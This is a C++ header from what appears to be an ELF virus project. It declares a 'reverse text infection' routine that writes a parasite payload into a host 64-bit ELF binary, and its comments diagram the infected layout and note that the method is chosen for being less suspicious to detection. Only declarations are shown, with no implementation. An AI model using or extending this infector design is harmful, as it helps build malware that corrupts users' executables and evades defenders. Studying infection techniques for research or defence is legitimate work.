#pragma once
#include "common/mmap.hh"

namespace vt::infector {
//  host elf structure            infected elf structure
//  -------------------           -----------------------
//  elf_hdr                       elf_hdr
//  phdrs                         *virus here
//  executale_sections            phdrs
//  padding                       executale_sections
//  non-exec sections             padding
//  shdrs                         non-exec sections
//                                shdrs
//
//
// The virus will increase file size, but because the entry will still point to
// the .text section (which is extended reversely), it is less suspicious.
//
//  infected elf segments
//  -------------------
//  LOAD RX
//    Ehdr
//    *virus
//    phdrs
//    interp
//  PADDING
//  LOAD RW
//    .data
//    ...
bool reverse_text_infect64(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                           common::Mmap<PROT_READ> parasite_mapping);

struct ReverseTextInfect {
  static size_t output_size(size_t host_size, size_t parasite_size);
  bool operator()(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                  common::Mmap<PROT_READ> parasite_mapping) {
    return reverse_text_infect64(vt::move(host_mapping),
                                 vt::move(parasite_mapping));
  }
};

}  // namespace vt::infector